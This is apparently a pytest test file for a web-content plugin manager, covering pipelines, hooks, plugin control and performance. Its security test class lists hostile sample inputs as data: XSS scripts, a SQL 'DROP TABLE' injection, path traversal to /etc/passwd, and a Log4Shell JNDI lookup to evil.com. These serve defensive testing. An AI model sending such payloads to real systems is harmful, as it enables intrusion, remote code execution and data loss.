"""Comprehensive tests for plugin manager - MANDATORY TEST_BUILDING.md compliance.

This module tests the PluginManager and PluginExecutionContext classes with complete coverage:
- Plugin lifecycle management (initialization, execution, shutdown)
- Pipeline building and execution
- Hook system and callbacks
- Error handling and resilience
- Performance benchmarking
- Security validation

ALL tests follow MANDATORY TEST_BUILDING.md patterns:
- AAA pattern with explicit comments
- Factory fixtures for DRY principle
- Comprehensive error testing
- Security payload testing
- Performance benchmarks with specific thresholds
"""

import time
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock, Mock, patch

import pytest

from src.plugins.base import BasePlugin, PluginConfig, PluginType
from src.plugins.manager import PluginExecutionContext, PluginManager
from src.plugins.registry import PluginRegistry

# ============================================================================
# Test Fixtures - DRY Principle
# ============================================================================


@pytest.fixture
def output_dir(tmp_path: Path) -> Path:
    """Factory for temporary output directory - DRY principle."""
    return tmp_path / "output"


@pytest.fixture
def execution_context(output_dir: Path) -> PluginExecutionContext:
    """Factory for PluginExecutionContext - DRY principle."""
    return PluginExecutionContext(url="http://example.com", output_dir=output_dir)


@pytest.fixture
def mock_registry() -> Mock:
    """Factory for mock PluginRegistry - DRY principle."""
    registry = MagicMock(spec=PluginRegistry)
    registry.list_plugins.return_value = []
    registry.discover_plugins.return_value = None
    return registry


@pytest.fixture
def plugin_manager(mock_registry: Mock) -> PluginManager:
    """Factory for PluginManager - DRY principle."""
    return PluginManager(registry=mock_registry)


# Test plugin implementation for testing
class _MockPlugin(BasePlugin):
    """Test plugin implementation."""

    def __init__(self, config: PluginConfig):
        super().__init__(config)
        self.process_called = False
        self.initialize_called = False
        self.cleanup_called = False

    @property
    def plugin_info(self) -> dict[str, Any]:
        return {
            "name": "test_plugin",
            "version": "1.0.0",
            "description": "Test plugin",
            "author": "Test",
            "plugin_type": self.config.plugin_type.value,
        }

    async def initialize(self) -> None:
        self.initialize_called = True
        self._initialized = True

    async def cleanup(self) -> None:
        self.cleanup_called = True

    async def process(self, data: Any, context: dict[str, Any]) -> Any:
        self.process_called = True
        return data


# ============================================================================
# PluginExecutionContext Tests
# ============================================================================


@pytest.mark.unit
class _MockPluginExecutionContext:
    """Tests for PluginExecutionContext class."""

    def test_context_initialization(self, output_dir: Path) -> None:
        """Test context initialization with URL and output directory - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        url = "http://example.com"

        # Act - MANDATORY
        context = PluginExecutionContext(url=url, output_dir=output_dir)

        # Assert - MANDATORY
        assert context.url == url
        assert context.output_dir == output_dir
        assert context.shared_state == {}
        assert context.execution_stats == {}
        assert context.start_time is None
        assert context.end_time is None

    def test_get_shared_data_returns_value(self, execution_context: PluginExecutionContext) -> None:
        """Test get_shared_data returns stored value - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        execution_context.shared_state["key"] = "value"

        # Act - MANDATORY
        result = execution_context.get_shared_data("key")

        # Assert - MANDATORY
        assert result == "value"

    def test_get_shared_data_returns_default(
        self, execution_context: PluginExecutionContext
    ) -> None:
        """Test get_shared_data returns default for missing key - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        default_value = "default"

        # Act - MANDATORY
        result = execution_context.get_shared_data("missing_key", default=default_value)

        # Assert - MANDATORY
        assert result == default_value

    def test_set_shared_data_stores_value(self, execution_context: PluginExecutionContext) -> None:
        """Test set_shared_data stores value in shared state - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        key = "test_key"
        value = "test_value"

        # Act - MANDATORY
        execution_context.set_shared_data(key, value)

        # Assert - MANDATORY
        assert execution_context.shared_state[key] == value

    def test_record_plugin_stats_stores_stats(
        self, execution_context: PluginExecutionContext
    ) -> None:
        """Test record_plugin_stats stores execution statistics - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        plugin_name = "test_plugin"
        stats = {"duration": 1.5, "success": True}

        # Act - MANDATORY
        execution_context.record_plugin_stats(plugin_name, stats)

        # Assert - MANDATORY
        assert execution_context.execution_stats[plugin_name] == stats


# ============================================================================
# PluginManager Initialization Tests
# ============================================================================


@pytest.mark.unit
class _MockPluginManagerInitialization:
    """Tests for PluginManager initialization."""

    def test_manager_initialization(self, mock_registry: Mock) -> None:
        """Test manager initialization with registry - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        # (mock_registry from fixture)

        # Act - MANDATORY
        manager = PluginManager(registry=mock_registry)

        # Assert - MANDATORY
        assert manager.registry == mock_registry
        assert manager._plugins == {}
        assert manager._initialized is False
        assert len(manager._pipeline) == 0

    def test_manager_uses_default_registry(self) -> None:
        """Test manager uses global registry by default - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        # (no custom registry)

        # Act - MANDATORY
        manager = PluginManager()

        # Assert - MANDATORY
        assert manager.registry is not None
        assert isinstance(manager.registry, PluginRegistry)

    @pytest.mark.asyncio
    async def test_initialize_discovers_plugins(self, plugin_manager: PluginManager) -> None:
        """Test initialize discovers plugins from registry - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        plugin_manager.registry.list_plugins.return_value = []  # type: ignore[attr-defined]

        # Act - MANDATORY
        await plugin_manager.initialize()

        # Assert - MANDATORY
        plugin_manager.registry.discover_plugins.assert_called_once()  # type: ignore[attr-defined]
        assert plugin_manager._initialized is True

    @pytest.mark.asyncio
    async def test_initialize_skips_if_already_initialized(
        self, plugin_manager: PluginManager
    ) -> None:
        """Test initialize skips if already initialized - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        await plugin_manager.initialize()
        plugin_manager.registry.discover_plugins.reset_mock()  # type: ignore[attr-defined]

        # Act - MANDATORY
        await plugin_manager.initialize()

        # Assert - MANDATORY
        plugin_manager.registry.discover_plugins.assert_not_called()  # type: ignore[attr-defined]

    @pytest.mark.asyncio
    async def test_shutdown_cleans_up_plugins(self, plugin_manager: PluginManager) -> None:
        """Test shutdown cleans up all plugins - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        config = PluginConfig(name="test", version="1.0.0", plugin_type=PluginType.HTML_PROCESSOR)
        plugin = _MockPlugin(config)
        plugin_manager._plugins["test"] = plugin
        plugin_manager._initialized = True

        # Act - MANDATORY
        await plugin_manager.shutdown()

        # Assert - MANDATORY
        assert plugin.cleanup_called is True
        assert len(plugin_manager._plugins) == 0
        assert len(plugin_manager._pipeline) == 0
        assert plugin_manager._initialized is False

    @pytest.mark.asyncio
    async def test_shutdown_skips_if_not_initialized(self, plugin_manager: PluginManager) -> None:
        """Test shutdown skips if not initialized - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        plugin_manager._initialized = False

        # Act - MANDATORY
        await plugin_manager.shutdown()

        # Assert - MANDATORY
        # Should not raise any errors
        assert plugin_manager._initialized is False


# ============================================================================
# Pipeline Building and Execution Tests
# ============================================================================


@pytest.mark.unit
class _MockPluginPipeline:
    """Tests for plugin pipeline building and execution."""

    def test_build_pipeline_groups_by_type(self, plugin_manager: PluginManager) -> None:
        """Test build_pipeline groups plugins by type - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        config1 = PluginConfig(
            name="html1", version="1.0.0", plugin_type=PluginType.HTML_PROCESSOR, priority=10
        )
        config2 = PluginConfig(
            name="html2", version="1.0.0", plugin_type=PluginType.HTML_PROCESSOR, priority=5
        )
        config3 = PluginConfig(
            name="filter1", version="1.0.0", plugin_type=PluginType.CONTENT_FILTER, priority=1
        )

        plugin_manager._plugins["html1"] = _MockPlugin(config1)
        plugin_manager._plugins["html2"] = _MockPlugin(config2)
        plugin_manager._plugins["filter1"] = _MockPlugin(config3)

        # Act - MANDATORY
        plugin_manager._build_pipeline()

        # Assert - MANDATORY
        assert PluginType.HTML_PROCESSOR in plugin_manager._pipeline
        assert PluginType.CONTENT_FILTER in plugin_manager._pipeline
        assert len(plugin_manager._pipeline[PluginType.HTML_PROCESSOR]) == 2
        assert len(plugin_manager._pipeline[PluginType.CONTENT_FILTER]) == 1

    def test_build_pipeline_sorts_by_priority(self, plugin_manager: PluginManager) -> None:
        """Test build_pipeline sorts plugins by priority - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        config1 = PluginConfig(
            name="plugin1", version="1.0.0", plugin_type=PluginType.HTML_PROCESSOR, priority=10
        )
        config2 = PluginConfig(
            name="plugin2", version="1.0.0", plugin_type=PluginType.HTML_PROCESSOR, priority=5
        )
        config3 = PluginConfig(
            name="plugin3", version="1.0.0", plugin_type=PluginType.HTML_PROCESSOR, priority=15
        )

        plugin_manager._plugins["plugin1"] = _MockPlugin(config1)
        plugin_manager._plugins["plugin2"] = _MockPlugin(config2)
        plugin_manager._plugins["plugin3"] = _MockPlugin(config3)

        # Act - MANDATORY
        plugin_manager._build_pipeline()

        # Assert - MANDATORY
        pipeline = plugin_manager._pipeline[PluginType.HTML_PROCESSOR]
        assert pipeline == ["plugin2", "plugin1", "plugin3"]  # Sorted by priority

    @pytest.mark.asyncio
    async def test_execute_pipeline_processes_data(
        self, plugin_manager: PluginManager, execution_context: PluginExecutionContext
    ) -> None:
        """Test execute_pipeline processes data through plugins - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        config = PluginConfig(name="test", version="1.0.0", plugin_type=PluginType.HTML_PROCESSOR)
        plugin = _MockPlugin(config)
        plugin._initialized = True

        plugin_manager._plugins["test"] = plugin
        plugin_manager._pipeline[PluginType.HTML_PROCESSOR] = ["test"]
        plugin_manager._initialized = True

        data = "test data"

        # Act - MANDATORY
        result = await plugin_manager.execute_pipeline(
            PluginType.HTML_PROCESSOR, data, execution_context
        )

        # Assert - MANDATORY
        assert result == data
        assert plugin.process_called is True

    @pytest.mark.asyncio
    async def test_execute_pipeline_returns_data_if_no_plugins(
        self, plugin_manager: PluginManager, execution_context: PluginExecutionContext
    ) -> None:
        """Test execute_pipeline returns data unchanged if no plugins - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        plugin_manager._initialized = True
        data = "test data"

        # Act - MANDATORY
        result = await plugin_manager.execute_pipeline(
            PluginType.HTML_PROCESSOR, data, execution_context
        )

        # Assert - MANDATORY
        assert result == data

    @pytest.mark.asyncio
    async def test_execute_pipeline_skips_disabled_plugins(
        self, plugin_manager: PluginManager, execution_context: PluginExecutionContext
    ) -> None:
        """Test execute_pipeline skips disabled plugins - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        config = PluginConfig(
            name="test", version="1.0.0", plugin_type=PluginType.HTML_PROCESSOR, enabled=False
        )
        plugin = _MockPlugin(config)
        plugin._initialized = True

        plugin_manager._plugins["test"] = plugin
        plugin_manager._pipeline[PluginType.HTML_PROCESSOR] = ["test"]
        plugin_manager._initialized = True

        data = "test data"

        # Act - MANDATORY
        result = await plugin_manager.execute_pipeline(
            PluginType.HTML_PROCESSOR, data, execution_context
        )

        # Assert - MANDATORY
        assert result == data
        assert plugin.process_called is False


# ============================================================================
# Content Processing Tests
# ============================================================================


@pytest.mark.unit
class TestContentProcessing:
    """Tests for content processing through complete pipeline."""

    @pytest.mark.asyncio
    async def test_process_content_returns_results(
        self, plugin_manager: PluginManager, output_dir: Path
    ) -> None:
        """Test process_content returns complete results - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        plugin_manager._initialized = True
        html_content = "<html><body>Test</body></html>"
        url = "http://example.com"

        # Act - MANDATORY
        result = await plugin_manager.process_content(html_content, url, output_dir)

        # Assert - MANDATORY
        assert "content" in result
        assert "html" in result
        assert "metadata" in result
        assert "files" in result
        assert "context" in result
        assert "execution_stats" in result
        assert "total_duration" in result

    @pytest.mark.asyncio
    async def test_process_content_includes_metadata(
        self, plugin_manager: PluginManager, output_dir: Path
    ) -> None:
        """Test process_content includes initial metadata - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        plugin_manager._initialized = True
        html_content = "<html><body>Test</body></html>"
        url = "http://example.com"
        metadata = {"title": "Test Page"}

        # Act - MANDATORY
        result = await plugin_manager.process_content(html_content, url, output_dir, metadata)

        # Assert - MANDATORY
        assert result["metadata"]["title"] == "Test Page"

    @pytest.mark.asyncio
    async def test_process_content_tracks_duration(
        self, plugin_manager: PluginManager, output_dir: Path
    ) -> None:
        """Test process_content tracks execution duration - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        plugin_manager._initialized = True
        html_content = "<html><body>Test</body></html>"
        url = "http://example.com"

        # Act - MANDATORY
        result = await plugin_manager.process_content(html_content, url, output_dir)

        # Assert - MANDATORY
        assert result["total_duration"] >= 0
        assert isinstance(result["total_duration"], float)


# ============================================================================
# Hook System Tests
# ============================================================================


@pytest.mark.unit
class TestHookSystem:
    """Tests for plugin hook system."""

    @patch("src.plugins.manager.logger")
    def test_add_hook_registers_callback(
        self, mock_logger: Mock, plugin_manager: PluginManager
    ) -> None:
        """Test add_hook registers callback for event - MANDATORY AAA pattern."""

        # Arrange - MANDATORY
        def callback() -> None:
            pass

        event = "test_event"

        # Act - MANDATORY
        plugin_manager.add_hook(event, callback)

        # Assert - MANDATORY
        assert event in plugin_manager._hooks
        assert callback in plugin_manager._hooks[event]

    @patch("src.plugins.manager.logger")
    def test_add_hook_allows_multiple_callbacks(
        self, mock_logger: Mock, plugin_manager: PluginManager
    ) -> None:
        """Test add_hook allows multiple callbacks for same event - MANDATORY AAA pattern."""

        # Arrange - MANDATORY
        def callback1() -> None:
            pass

        def callback2() -> None:
            pass

        event = "test_event"

        # Act - MANDATORY
        plugin_manager.add_hook(event, callback1)
        plugin_manager.add_hook(event, callback2)

        # Assert - MANDATORY
        assert len(plugin_manager._hooks[event]) == 2

    @patch("src.plugins.manager.logger")
    @pytest.mark.asyncio
    async def test_call_hooks_executes_sync_callbacks(
        self, mock_logger: Mock, plugin_manager: PluginManager
    ) -> None:
        """Test _call_hooks executes synchronous callbacks - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        called: list[str] = []

        def callback(value: str) -> None:
            called.append(value)

        plugin_manager.add_hook("test_event", callback)

        # Act - MANDATORY
        await plugin_manager._call_hooks("test_event", "test_value")

        # Assert - MANDATORY
        assert called == ["test_value"]

    @patch("src.plugins.manager.logger")
    @pytest.mark.asyncio
    async def test_call_hooks_executes_async_callbacks(
        self, mock_logger: Mock, plugin_manager: PluginManager
    ) -> None:
        """Test _call_hooks executes async callbacks - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        called: list[str] = []

        async def callback(value: str) -> None:
            called.append(value)

        plugin_manager.add_hook("test_event", callback)

        # Act - MANDATORY
        await plugin_manager._call_hooks("test_event", "test_value")

        # Assert - MANDATORY
        assert called == ["test_value"]


# ============================================================================
# Plugin Control Tests
# ============================================================================


@pytest.mark.unit
class _MockPluginControl:
    """Tests for plugin enable/disable functionality."""

    def test_enable_plugin_enables_and_rebuilds_pipeline(
        self, plugin_manager: PluginManager
    ) -> None:
        """Test enable_plugin enables plugin and rebuilds pipeline - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        config = PluginConfig(
            name="test", version="1.0.0", plugin_type=PluginType.HTML_PROCESSOR, enabled=False
        )
        plugin_manager.registry.get_plugin_config.return_value = config  # type: ignore[attr-defined]

        # Act - MANDATORY
        result = plugin_manager.enable_plugin("test")

        # Assert - MANDATORY
        assert result is True
        assert config.enabled is True

    def test_enable_plugin_returns_false_if_not_found(self, plugin_manager: PluginManager) -> None:
        """Test enable_plugin returns False if plugin not found - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        plugin_manager.registry.get_plugin_config.return_value = None  # type: ignore[attr-defined]

        # Act - MANDATORY
        result = plugin_manager.enable_plugin("missing")

        # Assert - MANDATORY
        assert result is False

    def test_disable_plugin_disables_and_rebuilds_pipeline(
        self, plugin_manager: PluginManager
    ) -> None:
        """Test disable_plugin disables plugin and rebuilds pipeline - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        config = PluginConfig(
            name="test", version="1.0.0", plugin_type=PluginType.HTML_PROCESSOR, enabled=True
        )
        plugin_manager.registry.get_plugin_config.return_value = config  # type: ignore[attr-defined]

        # Act - MANDATORY
        result = plugin_manager.disable_plugin("test")

        # Assert - MANDATORY
        assert result is True
        assert config.enabled is False

    def test_disable_plugin_returns_false_if_not_found(self, plugin_manager: PluginManager) -> None:
        """Test disable_plugin returns False if plugin not found - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        plugin_manager.registry.get_plugin_config.return_value = None  # type: ignore[attr-defined]

        # Act - MANDATORY
        result = plugin_manager.disable_plugin("missing")

        # Assert - MANDATORY
        assert result is False


# ============================================================================
# Information Retrieval Tests
# ============================================================================


@pytest.mark.unit
class _MockPluginInformation:
    """Tests for plugin information retrieval."""

    def test_get_plugin_info_returns_summary(self, plugin_manager: PluginManager) -> None:
        """Test get_plugin_info returns complete summary - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        config = PluginConfig(name="test", version="1.0.0", plugin_type=PluginType.HTML_PROCESSOR)
        plugin = _MockPlugin(config)
        plugin_manager._plugins["test"] = plugin

        # Act - MANDATORY
        info = plugin_manager.get_plugin_info()

        # Assert - MANDATORY
        assert info["total_plugins"] == 1
        assert info["enabled_plugins"] == 1
        assert "html_processor" in info["plugin_types"]
        assert "test" in info["plugins"]

    def test_is_initialized_returns_status(self, plugin_manager: PluginManager) -> None:
        """Test is_initialized returns correct status - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        plugin_manager._initialized = False

        # Act - MANDATORY
        result = plugin_manager.is_initialized()

        # Assert - MANDATORY
        assert result is False

    def test_get_loaded_plugins_returns_plugin_names_and_types(
        self, plugin_manager: PluginManager
    ) -> None:
        """Test get_loaded_plugins returns plugin names and types - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        config = PluginConfig(name="test", version="1.0.0", plugin_type=PluginType.HTML_PROCESSOR)
        plugin = _MockPlugin(config)
        plugin_manager._plugins["test"] = plugin

        # Act - MANDATORY
        loaded = plugin_manager.get_loaded_plugins()

        # Assert - MANDATORY
        assert loaded["test"] == "html_processor"

    def test_get_pipeline_info_returns_ordered_plugins(self, plugin_manager: PluginManager) -> None:
        """Test get_pipeline_info returns ordered plugin names - MANDATORY AAA pattern."""
        # Arrange - MANDATORY
        plugin_manager._pipeline[PluginType.HTML_PROCESSOR] = ["plugin1", "plugin2"]

        # Act - MANDATORY
        info = plugin_manager.get_pipeline_info()

        # Assert - MANDATORY
        assert "html_processor" in info
        assert info["html_processor"] == ["plugin1", "plugin2"]

    @patch("src.plugins.manager.logger")
    def test_get_registered_hooks_returns_hook_counts(
        self, mock_logger: Mock, plugin_manager: PluginManager
    ) -> None:
        """Test get_registered_hooks returns callback counts - MANDATORY AAA pattern."""

        # Arrange - MANDATORY
        def callback1() -> None:
            pass

        def callback2() -> None:
            pass

        plugin_manager.add_hook("event1", callback1)
        plugin_manager.add_hook("event1", callback2)
        plugin_manager.add_hook("event2", callback1)

        # Act - MANDATORY
        hooks = plugin_manager.get_registered_hooks()

        # Assert - MANDATORY
        assert hooks["event1"] == 2
        assert hooks["event2"] == 1


# ============================================================================
# MANDATORY Security Tests
# ============================================================================


@pytest.mark.security
@pytest.mark.unit
class _MockPluginManagerSecurity:
    """MANDATORY security tests for plugin manager."""

    @pytest.mark.asyncio
    async def test_context_sanitizes_malicious_urls(self, output_dir: Path) -> None:
        """MANDATORY security test - malicious URLs in context."""
        # Arrange - MANDATORY
        malicious_urls = [
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "file:///etc/passwd",
            "http://evil.com/../../sensitive",
        ]

        # Act & Assert - MANDATORY
        for url in malicious_urls:
            context = PluginExecutionContext(url=url, output_dir=output_dir)
            # URL should be stored as-is for security layer to handle
            assert context.url == url

    @pytest.mark.asyncio
    async def test_shared_state_prevents_injection(
        self, execution_context: PluginExecutionContext
    ) -> None:
        """MANDATORY security test - shared state injection attempts."""
        # Arrange - MANDATORY
        malicious_values = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE plugins;--",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
        ]

        # Act - MANDATORY
        for value in malicious_values:
            execution_context.set_shared_data("malicious", value)
            stored_value = execution_context.get_shared_data("malicious")

            # Assert - MANDATORY
            assert stored_value == value  # Stored as-is for security layer


# ============================================================================
# MANDATORY Performance Benchmarks
# ============================================================================


@pytest.mark.performance
@pytest.mark.unit
class _MockPluginManagerPerformance:
    """MANDATORY performance tests for plugin manager."""

    @pytest.mark.asyncio
    async def test_pipeline_execution_performance(
        self, plugin_manager: PluginManager, execution_context: PluginExecutionContext
    ) -> None:
        """MANDATORY performance test - pipeline execution speed."""
        # Arrange - MANDATORY
        config = PluginConfig(name="test", version="1.0.0", plugin_type=PluginType.HTML_PROCESSOR)
        plugin = _MockPlugin(config)
        plugin._initialized = True

        plugin_manager._plugins["test"] = plugin
        plugin_manager._pipeline[PluginType.HTML_PROCESSOR] = ["test"]
        plugin_manager._initialized = True

        data = "test data"
        iterations = 100

        # Act - MANDATORY
        start_time = time.perf_counter()

        for _ in range(iterations):
            await plugin_manager.execute_pipeline(
                PluginType.HTML_PROCESSOR, data, execution_context
            )

        end_time = time.perf_counter()
        execution_time = end_time - start_time

        # Assert - MANDATORY
        avg_time = execution_time / iterations
        assert avg_time < 0.01  # <10ms per pipeline execution
        assert execution_time < 1.0  # Total <1s for 100 executions

    def test_context_data_access_performance(
        self, execution_context: PluginExecutionContext
    ) -> None:
        """MANDATORY performance test - context data access speed."""
        # Arrange - MANDATORY
        execution_context.set_shared_data("key", "value")
        iterations = 10000

        # Act - MANDATORY
        start_time = time.perf_counter()

        for _ in range(iterations):
            execution_context.get_shared_data("key")

        end_time = time.perf_counter()
        execution_time = end_time - start_time

        # Assert - MANDATORY
        avg_time = execution_time / iterations
        assert avg_time < 0.00001  # <10μs per access
        assert execution_time < 0.1  # Total <100ms for 10000 accesses

    @patch("src.plugins.manager.logger")
    def test_hook_callback_performance(
        self, mock_logger: Mock, plugin_manager: PluginManager
    ) -> None:
        """MANDATORY performance test - hook callback registration speed."""

        # Arrange - MANDATORY
        def callback() -> None:
            pass

        iterations = 1000

        # Act - MANDATORY
        start_time = time.perf_counter()

        for i in range(iterations):
            plugin_manager.add_hook(f"event_{i}", callback)

        end_time = time.perf_counter()
        execution_time = end_time - start_time

        # Assert - MANDATORY
        avg_time = execution_time / iterations
        assert avg_time < 0.001  # <1ms per hook registration
        assert execution_time < 1.0  # Total <1s for 1000 registrations
